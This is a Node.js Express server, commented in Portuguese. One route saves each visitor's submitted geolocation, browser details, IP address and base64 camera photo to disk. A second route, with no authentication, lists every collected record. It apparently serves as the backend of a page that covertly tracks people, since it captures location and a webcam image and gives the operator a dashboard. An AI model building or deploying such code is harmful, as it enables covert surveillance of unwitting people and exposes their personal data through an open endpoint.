const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const { v4: uuidv4 } = require('uuid');

const app = express();
const PORT = process.env.PORT || 3000;

// ===== PASTA DE UPLOADS =====
const UPLOAD_DIR = path.join(__dirname, 'uploads');

if (!fs.existsSync(UPLOAD_DIR)) {
    fs.mkdirSync(UPLOAD_DIR, { recursive: true });
    console.log('📁 Pasta uploads criada');
}

// ===== MIDDLEWARES =====
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// ===== ARQUIVOS ESTÁTICOS =====
app.use(express.static(path.join(__dirname, 'frontend')));

// ===== ROTA DE COLETA =====
app.post('/api/coletar', async (req, res) => {
    console.log('📥 Coleta recebida');

    try {
        const dados = req.body;
        const id = uuidv4();
        const timestamp = Date.now();
        const dataHora = new Date().toISOString();

        let fotoSalva = false;
        let fotoBase64 = null;

        if (dados.foto && dados.foto.startsWith('data:image')) {
            try {
                const base64Data = dados.foto.replace(/^data:image\/\w+;base64,/, '');
                const extensao = dados.foto.match(/^data:image\/(\w+);base64,/)?.[1] || 'jpg';
                const nomeFoto = `foto_${id}_${timestamp}.${extensao}`;
                fotoBase64 = dados.foto;
                
                const fotoPath = path.join(UPLOAD_DIR, nomeFoto);
                fs.writeFileSync(fotoPath, base64Data, 'base64');
                fotoSalva = true;
                console.log(`✅ Foto salva`);
            } catch (err) {
                console.error(`❌ Erro foto: ${err.message}`);
            }
        }

        const dadosParaSalvar = {
            id,
            timestamp: dataHora,
            localizacao: dados.localizacao || null,
            navegador: dados.navegador || null,
            ip: req.ip || req.connection.remoteAddress || 'IP não disponível',
            foto: fotoBase64,
            fotoSalva: fotoSalva
        };

        const jsonPath = path.join(UPLOAD_DIR, `dados_${id}_${timestamp}.json`);
        fs.writeFileSync(jsonPath, JSON.stringify(dadosParaSalvar, null, 2));

        res.json({ status: 'success', id, fotoSalva, timestamp: dataHora });

    } catch (error) {
        console.error('💥 ERRO:', error);
        res.status(500).json({ status: 'error', mensagem: error.message });
    }
});

// ===== ROTA ADMIN =====
app.get('/api/admin', (req, res) => {
    console.log('📊 Admin: Buscando dados...');

    try {
        if (!fs.existsSync(UPLOAD_DIR)) {
            return res.json({ total: 0, arquivos: [] });
        }

        const arquivos = fs.readdirSync(UPLOAD_DIR)
            .filter(f => f.startsWith('dados_') && f.endsWith('.json'))
            .map(f => {
                const caminho = path.join(UPLOAD_DIR, f);
                try {
                    const conteudo = JSON.parse(fs.readFileSync(caminho, 'utf8'));
                    return {
                        arquivo: f,
                        data: conteudo.timestamp || new Date().toISOString(),
                        conteudo: conteudo
                    };
                } catch (e) {
                    return null;
                }
            })
            .filter(item => item !== null)
            .sort((a, b) => b.data.localeCompare(a.data));

        res.json({ total: arquivos.length, arquivos: arquivos });

    } catch (error) {
        res.status(500).json({ erro: error.message });
    }
});

// ===== ROTA PADRÃO =====
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'frontend', 'index.html'));
});

// ===== INICIA O SERVIDOR =====
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Servidor rodando na porta ${PORT}`);
    console.log(`📁 Uploads: ${UPLOAD_DIR}`);
});
